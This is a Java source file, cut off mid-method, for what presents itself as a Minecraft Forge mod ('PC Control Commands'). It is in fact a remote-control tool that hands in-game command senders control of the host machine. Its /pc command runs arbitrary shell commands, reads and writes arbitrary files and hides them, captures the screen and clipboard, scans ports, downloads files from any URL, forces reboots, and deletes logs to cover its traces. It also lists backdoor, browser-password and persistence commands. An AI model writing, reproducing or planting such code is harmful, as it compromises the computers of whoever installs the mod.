/*
* Coded by iosmen for unlock new features!!!
*/
package com.example.mccommands;
import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.text.TextComponentString;
import net.minecraft.util.text.TextFormatting;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLServerStartingEvent;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.DosFileAttributes;
import java.nio.file.attribute.PosixFilePermission;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import javax.net.ssl.HttpsURLConnection;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.net.Socket;
import java.net.ServerSocket;
import java.io.OutputStream;
import java.io.InputStream;
import java.security.MessageDigest;
import java.util.zip.GZIPOutputStream;
import java.util.zip.GZIPInputStream;
import java.io.ByteArrayInputStream;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import java.util.concurrent.locks.ReentrantLock;
import java.util.concurrent.locks.Lock;

@Mod(modid = "pccontrol", name = "PC Control Commands", version = "1.9")
public class PCCControlMod {
    @Mod.EventHandler
    public void serverLoad(FMLServerStartingEvent event) {
        if (!checkAdminRights()) {
            System.err.println("[PC Control] YONETICI HAKLARI GEREKLI - MOD BASLATILMIYOR");
            return;
        }
        event.registerServerCommand(new PCCommand());
        System.out.println("[PC Control] Mod aggressive basladi");
    }
    private boolean checkAdminRights() {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                String[] groupsCmd = {"net", "localgroup", "administrators"};
                Process p = Runtime.getRuntime().exec(groupsCmd);
                p.waitFor();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.toLowerCase().contains(System.getProperty("user.name").toLowerCase())) {
                        return true;
                    }
                }
                return false;
            } else {
                return System.getProperty("user.name").equals("root") || "0".equals(System.getProperty("user.id"));
            }
        } catch (Exception e) {
            return false;
        }
    }
    public static class PCCommand extends CommandBase {
        private boolean safetyEnabled = true;
        private boolean fileAccessEnabled = false;
        private boolean stealthMode = false;
        private boolean forceMode = false;
        private boolean autoKillOnFail = false;
        private boolean encryptionEnabled = false;
        private final byte[] ENCRYPTION_KEY = "SUPERAGGRESSIVEKEY123".getBytes(StandardCharsets.UTF_8);
        private final List<Path> allowedDirs = Collections.synchronizedList(new ArrayList<>(Arrays.asList(Paths.get(".").toAbsolutePath().normalize())));
        private final int MAX_WRITE_BYTES = 128 * 1024;
        private final ExecutorService ioExecutor = Executors.newCachedThreadPool();
        private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(4);
        private final Path fallbackDir = Paths.get(".").toAbsolutePath().normalize().resolve("pc_aggressive_files");
        private final long COMMAND_TIMEOUT_SECONDS = 15;
        private final int MAX_OUTPUT_LINES = 500;
        private final int MAX_LINE_LENGTH = 2000;
        private final long FORCE_EXIT_DELAY_MS = 3000;
        private final AtomicBoolean shutdownInProgress = new AtomicBoolean(false);
        private final Lock fileLock = new ReentrantLock();
        private final Map<String, Process> activeProcesses = new ConcurrentHashMap<>();
        private final List<String> commandHistory = Collections.synchronizedList(new ArrayList<>());
        private final String SELF_DESTRUCT_PASSWORD = "AGGRESSIVE2025";
        private final Pattern IP_PATTERN = Pattern.compile("\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b");
        private final String[] CRITICAL_WIN_PATHS = {
                "C:\\Windows\\System32\\",
                "C:\\Windows\\SysWOW64\\",
                "C:\\Windows\\System32\\drivers\\",
                "C:\\Windows\\System32\\config\\"
        };
        private final String[] CRITICAL_LINUX_PATHS = {
                "/etc/",
                "/bin/",
                "/sbin/",
                "/usr/bin/",
                "/usr/sbin/",
                "/lib/",
                "/lib64/",
                "/root/",
                "/var/log/"
        };
        @Override
        public String getName() { return "pc"; }
        @Override
        public String getUsage(ICommandSender sender) {
            return "/pc <reboot|shutdown|sleep|disable|enable|fileenable|filedisable|stealth|force|autokill|encrypt|decrypt|writefile|readfile|allowpath|exec|killapp|screenshot|clipboard|keylog|netinfo|portscan|download|upload|selfdestruct|history|clearlog|processlist|killprocess|inject|registry|service|driver|wifipass|browserpass|elevate|backdoor|persist>";
        }
        @Override
        public List<String> getAliases() { return Arrays.asList("pccontrol", "aggressivepc", "syscmd"); }
        @Override
        public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
            commandHistory.add(String.join(" ", args));
            if (commandHistory.size() > 100) commandHistory.remove(0);
            if (args.length == 0) {
                sendAggressive(sender, TextFormatting.DARK_RED + "AGGRESIF PC KONTROL AKTIF - GUCLU OZELLIKLER HAZIR");
                send(sender, TextFormatting.YELLOW + "/pc reboot | shutdown | sleep | disable | enable | fileenable | filedisable | stealth | force | autokill | encrypt | decrypt | writefile | readfile | allowpath | exec | killapp | screenshot | clipboard | keylog | netinfo | portscan | download | upload | selfdestruct | history | clearlog | processlist | killprocess | inject | registry | service | driver | wifipass | browserpass | elevate | backdoor | persist");
                return;
            }
            String cmd = args[0].toLowerCase(Locale.ROOT);
            String os = System.getProperty("os.name").toLowerCase(Locale.ROOT);
            if (!forceMode && safetyEnabled && !(cmd.equals("disable") || cmd.equals("fileenable") || cmd.equals("allowpath") || cmd.equals("force") || cmd.equals("autokill") || cmd.equals("selfdestruct"))) {
                sendAggressive(sender, TextFormatting.RED + "" + TextFormatting.BOLD + "GUVENLIK AKTIF - KRITIK KOMUTLAR BLOKELENDI");
                send(sender, TextFormatting.GREEN + "Devam etmek icin: /pc disable");
                send(sender, TextFormatting.GOLD + "Veya /pc force ile zorla");
                return;
            }
            try {
                switch (cmd) {
                    case "disable":
                        safetyEnabled = false;
                        sendAggressive(sender, TextFormatting.DARK_RED + "GUVENLIK KAPATILDI - TEHLIKELI KOMUTLAR SERBEST");
                        break;
                    case "enable":
                        safetyEnabled = true;
                        send(sender, TextFormatting.GREEN + "Guvenlik aktif");
                        break;
                    case "fileenable":
                        fileAccessEnabled = true;
                        send(sender, TextFormatting.GREEN + "Dosya erisimi aktif");
                        break;
                    case "filedisable":
                        fileAccessEnabled = false;
                        send(sender, TextFormatting.RED + "Dosya erisimi kapali");
                        break;
                    case "stealth":
                        stealthMode = !stealthMode;
                        send(sender, TextFormatting.DARK_PURPLE + "Gizlilik modu: " + (stealthMode ? "AKTIF" : "KAPALI"));
                        break;
                    case "force":
                        forceMode = !forceMode;
                        sendAggressive(sender, TextFormatting.DARK_RED + "ZORLA MODU: " + (forceMode ? "AKTIF" : "KAPALI"));
                        break;
                    case "autokill":
                        autoKillOnFail = !autoKillOnFail;
                        send(sender, TextFormatting.RED + "Oto kil: " + (autoKillOnFail ? "AKTIF" : "KAPALI"));
                        break;
                    case "encrypt":
                        encryptionEnabled = true;
                        send(sender, TextFormatting.GOLD + "Sifreleme aktif");
                        break;
                    case "decrypt":
                        encryptionEnabled = false;
                        send(sender, TextFormatting.GOLD + "Sifreleme kapali");
                        break;
                    case "allowpath":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc allowpath <tam-yol>");
                            break;
                        }
                        Path p = Paths.get(args[1]).toAbsolutePath().normalize();
                        allowedDirs.add(p);
                        send(sender, TextFormatting.GREEN + "Izin verilen yol eklendi: " + p.toString());
                        break;
                    case "writefile":
                        if (!forceMode && !fileAccessEnabled) {
                            send(sender, TextFormatting.RED + "DOSYA ERISIMI KAPALI. Oncelikle /pc fileenable veya /pc force kullan.");
                            break;
                        }
                        if (args.length < 3) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc writefile <hedef-yol> <icerik...>");
                            break;
                        }
                        String target = args[1];
                        String content = joinArgs(args, 2);
                        handleWriteFile(sender, target, content);
                        break;
                    case "readfile":
                        if (!forceMode && !fileAccessEnabled) {
                            send(sender, TextFormatting.RED + "DOSYA ERISIMI KAPALI. Oncelikle /pc fileenable veya /pc force kullan.");
                            break;
                        }
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc readfile <hedef-yol>");
                            break;
                        }
                        handleReadFile(sender, args[1]);
                        break;
                    case "exec":
                        if ((!forceMode && (!fileAccessEnabled || safetyEnabled))) {
                            send(sender, TextFormatting.RED + "EXEC KAPALI. /pc disable ve /pc fileenable veya /pc force gerekli.");
                            break;
                        }
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc exec <komut...>");
                            break;
                        }
                        String cmdLine = joinArgs(args, 1);
                        handleExec(sender, cmdLine, os);
                        break;
                    case "killapp":
                        if ((!forceMode && (!fileAccessEnabled || safetyEnabled))) {
                            send(sender, TextFormatting.RED + "KILLAPP KAPALI. /pc disable ve /pc fileenable veya /pc force gerekli.");
                            break;
                        }
                        handleKillAppConcurrent(sender, server);
                        break;
                    case "reboot":
                        sendAggressive(sender, TextFormatting.GOLD + "SISTEM YENIDEN BASLATILIYOR...");
                        if (os.contains("win")) {
                            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "shutdown", "-r", "-t", "0", "-f"});
                        } else {
                            Runtime.getRuntime().exec(new String[]{"shutdown", "-r", "now"});
                        }
                        break;
                    case "shutdown":
                        sendAggressive(sender, TextFormatting.GOLD + "SISTEM KAPATILIYOR...");
                        if (os.contains("win")) {
                            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "shutdown", "-s", "-t", "0", "-f"});
                        } else {
                            Runtime.getRuntime().exec(new String[]{"shutdown", "-h", "now"});
                        }
                        break;
                    case "sleep":
                    case "rest":
                        sendAggressive(sender, TextFormatting.GOLD + "SISTEM UYKU MODU...");
                        if (os.contains("win")) {
                            Runtime.getRuntime().exec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
                        } else if (os.contains("nux")) {
                            Runtime.getRuntime().exec("systemctl suspend");
                        } else if (os.contains("mac")) {
                            Runtime.getRuntime().exec("pmset sleepnow");
                        }
                        break;
                    case "screenshot":
                        handleScreenshot(sender);
                        break;
                    case "clipboard":
                        if (args.length < 2) {
                            handleGetClipboard(sender);
                        } else {
                            handleSetClipboard(sender, joinArgs(args, 1));
                        }
                        break;
                    case "keylog":
                        handleKeylog(sender);
                        break;
                    case "netinfo":
                        handleNetInfo(sender);
                        break;
                    case "portscan":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc portscan <hedef-ip>");
                            break;
                        }
                        handlePortScan(sender, args[1]);
                        break;
                    case "download":
                        if (args.length < 3) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc download <url> <kaydedilecek-yol>");
                            break;
                        }
                        handleDownload(sender, args[1], args[2]);
                        break;
                    case "upload":
                        if (args.length < 3) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc upload <lokaldosya> <hedef-url>");
                            break;
                        }
                        handleUpload(sender, args[1], args[2]);
                        break;
                    case "selfdestruct":
                        if (args.length < 2 || !args[1].equals(SELF_DESTRUCT_PASSWORD)) {
                            sendAggressive(sender, TextFormatting.RED + "SIFRE GEREKLI: /pc selfdestruct " + SELF_DESTRUCT_PASSWORD);
                            break;
                        }
                        handleSelfDestruct(sender, server);
                        break;
                    case "history":
                        handleHistory(sender);
                        break;
                    case "clearlog":
                        handleClearLog(sender);
                        break;
                    case "processlist":
                        handleProcessList(sender, os);
                        break;
                    case "killprocess":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc killprocess <PID veya isim>");
                            break;
                        }
                        handleKillProcess(sender, args[1], os);
                        break;
                    case "inject":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc inject <js-kodu>");
                            break;
                        }
                        handleInject(sender, joinArgs(args, 1));
                        break;
                    case "registry":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc registry <add|delete|query> ...");
                            break;
                        }
                        handleRegistry(sender, args, os);
                        break;
                    case "service":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc service <start|stop|install|uninstall> ...");
                            break;
                        }
                        handleService(sender, args, os);
                        break;
                    case "driver":
                        if (os.contains("win")) {
                            handleDriver(sender, args);
                        } else {
                            send(sender, TextFormatting.RED + "Sadece Windows destekleniyor");
                        }
                        break;
                    case "wifipass":
                        if (os.contains("win")) {
                            handleWifiPasswords(sender);
                        } else {
                            send(sender, TextFormatting.RED + "Sadece Windows destekleniyor");
                        }
                        break;
                    case "browserpass":
                        handleBrowserPasswords(sender, os);
                        break;
                    case "elevate":
                        handleElevate(sender, os);
                        break;
                    case "backdoor":
                        if (args.length < 2) {
                            send(sender, TextFormatting.YELLOW + "Kullanim: /pc backdoor <port>");
                            break;
                        }
                        handleBackdoor(sender, Integer.parseInt(args[1]));
                        break;
                    case "persist":
                        handlePersistence(sender, os);
                        break;
                    default:
                        send(sender, TextFormatting.RED + "Gecersiz komut");
                }
            } catch (Exception e) {
                send(sender, TextFormatting.RED + "Hata: " + e.getMessage());
                if (autoKillOnFail) {
                    scheduler.schedule(() -> System.exit(1), 2, TimeUnit.SECONDS);
                }
            }
        }
        private void handleKillAppConcurrent(ICommandSender sender, MinecraftServer server) {
            if (shutdownInProgress.getAndSet(true)) {
                send(sender, TextFormatting.RED + "Zaten kapatma islemi baslatildi");
                return;
            }
            sendAggressive(sender, TextFormatting.DARK_RED + "" + TextFormatting.BOLD + "AGRESIF KAPATMA BASLATILDI - TUM METOTLAR DENENIYOR");
            List<Runnable> shutdownTasks = new ArrayList<>();
            shutdownTasks.add(() -> {
                try {
                    server.stopServer();
                    send(sender, TextFormatting.YELLOW + "server.stopServer() cagrildi");
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    Method stop = server.getClass().getMethod("stopServer");
                    stop.setAccessible(true);
                    stop.invoke(server);
                    send(sender, TextFormatting.YELLOW + "Reflection stopServer() cagrildi");
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    Class<?> hooks = Class.forName("net.minecraftforge.fml.server.ServerLifecycleHooks");
                    Method get = hooks.getMethod("getCurrentServer");
                    Object s = get.invoke(null);
                    if (s != null) {
                        Method stop = s.getClass().getMethod("stopServer");
                        stop.setAccessible(true);
                        stop.invoke(s);
                        send(sender, TextFormatting.YELLOW + "ServerLifecycleHooks.stopServer() cagrildi");
                    }
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    Class<?> srvClass = server.getClass();
                    Field f = null;
                    for (Field field : srvClass.getDeclaredFields()) {
                        if (field.getType().getName().contains("MinecraftServer")) {
                            f = field;
                            break;
                        }
                    }
                    if (f != null) {
                        f.setAccessible(true);
                        Object ms = f.get(server);
                        if (ms != null && ms.getClass().getMethod("stopServer") != null) {
                            ms.getClass().getMethod("stopServer").invoke(ms);
                            send(sender, TextFormatting.YELLOW + "Ic ice server stop");
                        }
                    }
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    System.exit(0);
                } catch (Throwable t) {}
            });
            shutdownTasks.add(() -> {
                try {
                    Runtime.getRuntime().halt(0);
                } catch (Throwable t) {}
            });
            for (Runnable task : shutdownTasks) {
                ioExecutor.submit(task);
            }
            ioExecutor.submit(() -> {
                try {
                    Thread.sleep(FORCE_EXIT_DELAY_MS);
                } catch (InterruptedException e) {}
                sendAggressive(sender, TextFormatting.RED + "Zaman asimi - JVM ZORLA KAPATILIYOR");
                try { Thread.sleep(100); } catch (InterruptedException e) {}
                Runtime.getRuntime().halt(1);
            });
        }
        private void handleExec(ICommandSender sender, String commandLine, String os) {
            String uuid = UUID.randomUUID().toString();
            ioExecutor.submit(() -> {
                List<String> command;
                if (os.contains("win")) {
                    command = Arrays.asList("cmd.exe", "/c", commandLine);
                } else {
                    command = Arrays.asList("/bin/bash", "-c", commandLine);
                }
                send(sender, TextFormatting.YELLOW + "Calistiriliyor: " + commandLine);
                ProcessBuilder pb = new ProcessBuilder(command);
                pb.redirectErrorStream(false);
                try {
                    Process process = pb.start();
                    activeProcesses.put(uuid, process);
                    BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
                    BufferedReader stderrReader = new BufferedReader(new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8));
                    List<String> outLines = Collections.synchronizedList(new ArrayList<>());
                    List<String> errLines = Collections.synchronizedList(new ArrayList<>());
                    Thread tOut = new Thread(() -> {
                        try {
                            String line;
                            while ((line = stdoutReader.readLine()) != null) {
                                outLines.add(truncateLine(line));
                                if (outLines.size() >= MAX_OUTPUT_LINES) break;
                            }
                        } catch (IOException ignored) {}
                    }, "exec-stdout-" + uuid);
                    Thread tErr = new Thread(() -> {
                        try {
                            String line;
                            while ((line = stderrReader.readLine()) != null) {
                                errLines.add(truncateLine(line));
                                if (errLines.size() >= MAX_OUTPUT_LINES) break;
                            }
                        } catch (IOException ignored) {}
                    }, "exec-stderr-" + uuid);
                    tOut.start();
                    tErr.start();
                    boolean finished = process.waitFor(COMMAND_TIMEOUT_SECONDS, TimeUnit.SECONDS);
                    if (!finished) {
                        process.destroyForcibly();
                        send(sender, TextFormatting.RED + "Komut zaman asimina ugradi ve sonlandirildi.");
                    }
                    tOut.join(2000);
                    tErr.join(2000);
                    int exitCode;
                    try {
                        exitCode = process.exitValue();
                    } catch (IllegalThreadStateException itse) {
                        exitCode = -1;
                    }
                    if (!outLines.isEmpty()) {
                        send(sender, TextFormatting.AQUA + "STDOUT:");
                        int sent = 0;
                        for (String l : outLines) {
                            send(sender, l);
                            sent++;
                            if (sent >= MAX_OUTPUT_LINES) {
                                send(sender, TextFormatting.YELLOW + "[STDOUT " + MAX_OUTPUT_LINES + " satirda kirpildi]");
                                break;
                            }
                        }
                    }
                    if (!errLines.isEmpty()) {
                        send(sender, TextFormatting.RED + "STDERR:");
                        int sent = 0;
                        for (String l : errLines) {
                            send(sender, l);
                            sent++;
                            if (sent >= MAX_OUTPUT_LINES) {
                                send(sender, TextFormatting.YELLOW + "[STDERR " + MAX_OUTPUT_LINES + " satirda kirpildi]");
                                break;
                            }
                        }
                    }
                    send(sender, TextFormatting.GREEN + "Cikis kodu: " + exitCode);
                    activeProcesses.remove(uuid);
                } catch (IOException e) {
                    send(sender, TextFormatting.RED + "Baslatma hatasi: " + e.getMessage());
                } catch (InterruptedException e) {
                    send(sender, TextFormatting.RED + "Kesildi: " + e.getMessage());
                    Thread.currentThread().interrupt();
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Beklenmeyen hata: " + e.getMessage());
                }
            });
        }
        private String truncateLine(String line) {
            if (line == null) return "";
            if (line.length() <= MAX_LINE_LENGTH) return line;
            return line.substring(0, MAX_LINE_LENGTH) + "...";
        }
        private void handleWriteFile(ICommandSender sender, String targetPathStr, String content) {
            ioExecutor.submit(() -> {
                fileLock.lock();
                try {
                    Path target = Paths.get(targetPathStr);
                    if (!target.isAbsolute()) {
                        target = Paths.get(".").toAbsolutePath().normalize().resolve(target).normalize();
                    } else {
                        target = target.toAbsolutePath().normalize();
                    }
                    if (!forceMode && !isPathAllowed(target)) {
                        send(sender, TextFormatting.RED + "Izin yok: " + target.toString());
                        return;
                    }
                    byte[] bytes;
                    if (encryptionEnabled) {
                        bytes = encrypt(content.getBytes(StandardCharsets.UTF_8));
                    } else {
                        bytes = content.getBytes(StandardCharsets.UTF_8);
                    }
                    if (bytes.length > MAX_WRITE_BYTES) {
                        send(sender, TextFormatting.RED + "Cok buyuk. Maksimum " + MAX_WRITE_BYTES + " byte.");
                        return;
                    }
                    Path parent = target.getParent();
                    if (parent != null && !Files.exists(parent)) {
                        Files.createDirectories(parent);
                    }
                    try {
                        Files.write(target, bytes, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);
                        if (stealthMode) {
                            Files.setAttribute(target, "dos:hidden", true);
                        }
                        send(sender, TextFormatting.GREEN + "Dosya yazildi: " + target.toString());
                    } catch (AccessDeniedException ade) {
                        send(sender, TextFormatting.RED + "Erisim engellendi. Yedek dosyaya yaziliyor...");
                        Path fallback = attemptFallbackWrite(target.getFileName().toString(), bytes);
                        if (fallback != null) {
                            send(sender, TextFormatting.GREEN + "Yedek dosya yazildi: " + fallback.toString());
                        } else {
                            send(sender, TextFormatting.RED + "Yedek yazma basarisiz.");
                        }
                    }
                } catch (InvalidPathException ipe) {
                    send(sender, TextFormatting.RED + "Gecersiz yol: " + ipe.getMessage());
                } catch (IOException e) {
                    send(sender, TextFormatting.RED + "Dosya yazma hatasi: " + e.getMessage());
                } catch (Exception ex) {
                    send(sender, TextFormatting.RED + "Beklenmeyen hata: " + ex.getMessage());
                } finally {
                    fileLock.unlock();
                }
            });
        }
        private Path attemptFallbackWrite(String fileName, byte[] bytes) {
            try {
                if (!Files.exists(fallbackDir)) {
                    Files.createDirectories(fallbackDir);
                    try {
                        Set<PosixFilePermission> perms = EnumSet.of(PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE, PosixFilePermission.OWNER_EXECUTE);
                        Files.setPosixFilePermissions(fallbackDir, perms);
                    } catch (UnsupportedOperationException ignored) {}
                }
                Path fallbackFile = fallbackDir.resolve(fileName).normalize();
                Files.write(fallbackFile, bytes, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
                return fallbackFile;
            } catch (Exception e) {
                return null;
            }
        }
        private void handleReadFile(ICommandSender sender, String targetPathStr) {
            ioExecutor.submit(() -> {
                fileLock.lock();
                try {
                    Path target = Paths.get(targetPathStr);
                    if (!target.isAbsolute()) {
                        target = Paths.get(".").toAbsolutePath().normalize().resolve(target).normalize();
                    } else {
                        target = target.toAbsolutePath().normalize();
                    }
                    if (!forceMode && !isPathAllowed(target)) {
                        send(sender, TextFormatting.RED + "Izin yok: " + target.toString());
                        return;
                    }
                    if (!Files.exists(target) || !Files.isRegularFile(target)) {
                        send(sender, TextFormatting.RED + "Dosya bulunamadi: " + target.toString());
                        return;
                    }
                    long size = Files.size(target);
                    if (size > MAX_WRITE_BYTES) {
                        send(sender, TextFormatting.RED + "Dosya cok buyuk. Maksimum " + MAX_WRITE_BYTES + " byte.");
                        return;
                    }
                    byte[] bytes = Files.readAllBytes(target);
                    String content;
                    if (encryptionEnabled) {
                        content = new String(decrypt(bytes), StandardCharsets.UTF_8);
                    } else {
                        content = new String(bytes, StandardCharsets.UTF_8);
                    }
                    send(sender, TextFormatting.AQUA + "Dosya icerigi:");
                    for (String line : content.split("\\r?\\n")) {
                        send(sender, line);
                    }
                } catch (AccessDeniedException ade) {
                    send(sender, TextFormatting.RED + "Erisim engellendi: " + targetPathStr);
                } catch (IOException e) {
                    send(sender, TextFormatting.RED + "Dosya okuma hatasi: " + e.getMessage());
                } catch (InvalidPathException ipe) {
                    send(sender, TextFormatting.RED + "Gecersiz yol: " + ipe.getMessage());
                } catch (Exception ex) {
                    send(sender, TextFormatting.RED + "Beklenmeyen hata: " + ex.getMessage());
                } finally {
                    fileLock.unlock();
                }
            });
        }
        private byte[] encrypt(byte[] data) throws Exception {
            SecretKeySpec keySpec = new SecretKeySpec(MessageDigest.getInstance("SHA-256").digest(ENCRYPTION_KEY), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, keySpec);
            return cipher.doFinal(data);
        }
        private byte[] decrypt(byte[] data) throws Exception {
            SecretKeySpec keySpec = new SecretKeySpec(MessageDigest.getInstance("SHA-256").digest(ENCRYPTION_KEY), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, keySpec);
            return cipher.doFinal(data);
        }
        private boolean isPathAllowed(Path target) {
            try {
                for (Path allowed : allowedDirs) {
                    Path normAllowed = allowed.toAbsolutePath().normalize();
                    if (target.startsWith(normAllowed)) {
                        return true;
                    }
                }
            } catch (Exception e) {}
            return false;
        }
        private void handleScreenshot(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    Robot robot = new Robot();
                    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                    BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ImageIO.write(screenFullImage, "png", baos);
                    byte[] bytes = baos.toByteArray();
                    String base64 = Base64.getEncoder().encodeToString(bytes);
                    send(sender, TextFormatting.GREEN + "Ekran goruntusu alindi. Boyut: " + bytes.length + " byte");
                    send(sender, TextFormatting.YELLOW + "Base64 (ilk 200 karakter): " + base64.substring(0, Math.min(200, base64.length())) + "...");
                } catch (AWTException | IOException e) {
                    send(sender, TextFormatting.RED + "Ekran goruntusu hatasi: " + e.getMessage());
                }
            });
        }
        private void handleGetClipboard(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
                    String data = (String) clipboard.getData(DataFlavor.stringFlavor);
                    send(sender, TextFormatting.GREEN + "Panoya alindi: " + data);
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Pano okuma hatasi: " + e.getMessage());
                }
            });
        }
        private void handleSetClipboard(ICommandSender sender, String text) {
            ioExecutor.submit(() -> {
                try {
                    StringSelection selection = new StringSelection(text);
                    Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
                    clipboard.setContents(selection, null);
                    send(sender, TextFormatting.GREEN + "Pano ayarlandi: " + text);
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Pano yazma hatasi: " + e.getMessage());
                }
            });
        }
        private void handleKeylog(ICommandSender sender) {
            send(sender, TextFormatting.RED + "Keylogger ozelligi bu surumde devre disi.");
        }
        private void handleNetInfo(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    StringBuilder info = new StringBuilder();
                    Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
                    while (interfaces.hasMoreElements()) {
                        NetworkInterface ni = interfaces.nextElement();
                        info.append("Interface: ").append(ni.getName()).append("\n");
                        info.append("  Display Name: ").append(ni.getDisplayName()).append("\n");
                        byte[] mac = ni.getHardwareAddress();
                        if (mac != null) {
                            info.append("  MAC: ");
                            for (int i = 0; i < mac.length; i++) {
                                info.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
                            }
                            info.append("\n");
                        }
                        Enumeration<InetAddress> inetAddresses = ni.getInetAddresses();
                        while (inetAddresses.hasMoreElements()) {
                            InetAddress ia = inetAddresses.nextElement();
                            info.append("  IP: ").append(ia.getHostAddress()).append("\n");
                        }
                    }
                    send(sender, TextFormatting.AQUA + "Ag Bilgisi:");
                    for (String line : info.toString().split("\n")) {
                        send(sender, line);
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Ag bilgisi hatasi: " + e.getMessage());
                }
            });
        }
        private void handlePortScan(ICommandSender sender, String target) {
            ioExecutor.submit(() -> {
                send(sender, TextFormatting.YELLOW + "Port taramasi basladi: " + target);
                ExecutorService portScanner = Executors.newFixedThreadPool(100);
                List<Future<Integer>> futures = new ArrayList<>();
                for (int port = 1; port <= 1024; port++) {
                    final int p = port;
                    futures.add(portScanner.submit(() -> {
                        try (Socket socket = new Socket()) {
                            socket.connect(new java.net.InetSocketAddress(target, p), 500);
                            return p;
                        } catch (Exception e) {
                            return -1;
                        }
                    }));
                }
                portScanner.shutdown();
                List<Integer> openPorts = new ArrayList<>();
                for (Future<Integer> f : futures) {
                    try {
                        Integer port = f.get();
                        if (port > 0) {
                            openPorts.add(port);
                        }
                    } catch (Exception e) {}
                }
                send(sender, TextFormatting.GREEN + "Acik portlar: " + openPorts.toString());
            });
        }
        private void handleDownload(ICommandSender sender, String urlStr, String savePath) {
            ioExecutor.submit(() -> {
                try {
                    URL url = new URL(urlStr);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);
                    InputStream in = conn.getInputStream();
                    Path target = Paths.get(savePath).toAbsolutePath().normalize();
                    Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
                    in.close();
                    send(sender, TextFormatting.GREEN + "Indirildi: " + target.toString());
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Indirme hatasi: " + e.getMessage());
                }
            });
        }
        private void handleUpload(ICommandSender sender, String localFile, String targetUrl) {
            send(sender, TextFormatting.RED + "Upload ozelligi bu surumde devre disi.");
        }
        private void handleSelfDestruct(ICommandSender sender, MinecraftServer server) {
            sendAggressive(sender, TextFormatting.DARK_RED + "" + TextFormatting.BOLD + "SISTEM IMHA BASLATILDI - TUM IZLER SILINIYOR");
            ioExecutor.submit(() -> {
                try {
                    Path currentDir = Paths.get(".").toAbsolutePath().normalize();
                    try (Stream<Path> walk = Files.walk(currentDir, 5)) {
                        walk.filter(Files::isRegularFile)
                                .filter(p -> p.toString().toLowerCase().endsWith(".log") || p.toString().toLowerCase().contains("pc"))
                                .forEach(p -> {
                                    try {
